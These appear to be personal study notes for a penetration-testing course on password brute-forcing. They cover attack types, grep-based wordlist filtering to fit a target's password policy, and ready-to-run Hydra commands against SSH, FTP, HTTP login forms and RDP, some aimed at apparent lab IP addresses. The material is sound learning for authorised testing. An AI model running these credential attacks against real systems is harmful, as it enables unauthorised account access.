#CWES #bruteforce #hydra

**When to use brute forcing:**
- When other methods of getting access are exhausted
- Password policies on the target is weak 
- Specific accounts are targeted 

**Different types of brute forcing:**
- **Simple brute force**: try all combinations
- **Dict attack:** Use a dict like rockyou.txt
- **Hybrid attack:**  mix of simple bruteforce with dict attack, ex. adding numbers to a words in a dict
- **Credential stuffing:** passwords from cred leakages 
- **Password spraying:** small set of passwords, large set of usernames
- **Rainbow table:** Compare leaked hashes, with pre-computed hash-to-plaintext list. 
- **Reverse brute force:** single leaked password, against lots of users
- **Distributed brute force:** Cluster of nodes to distribute the computation.

Fun fact:
- Normal computer: can do 1 mill passwords per sec 
- Super computer: can do 1 trill passwords per sec 

**Useful wordslists:**
![[Pasted image 20260515053928.png]]

#### Hybrid attacks
- Combining multiple bruteforce methods 

![[Pasted image 20260519045458.png]]

- The target might have password policies which enforces passwords on a given format, we can use this to our advantage 
eks:
- Minimum length: 8 characters
- Must include:
    - At least one uppercase letter
    - At least one lowercase letter
    - At least one number

If we know this, we can filter our wordlist to match these requirements:

```shell
grep -E '^.{8,}$' darkweb2017_top-10000.txt > darkweb2017-minlength.txt
```
- Min 8 characters

```shell
grep -E '[A-Z]' darkweb2017-minlength.txt > darkweb2017-uppercase.txt
```
- Min 1 uppercase letter 

and so on... This will reduce the search space drastically. 

#### Hydra:
![[Pasted image 20260519050130.png]]


**Examples of using hydra:**

Multiple ssh targets:
```shell
hydra -l root -p toor -M targets.txt ssh
```

FTP on non standard port:
```shell
hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp
```

Login via http post request:
```shell
hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```
- Success check: S:302 


```shell
hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt 154.57.164.67 -s 30351  http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```
- Using wordlist for both username and password
- custom port 
- Fail check: F:Invalid credentials

Login via http get request
```shell
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 154.57.164.83 http-get / -s 31198
```

RDP via advanced bruteforce:
```shell
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
```
- 6 - 8 characters, from upper, lower and numbers 
- specifying port, ip and protocol 

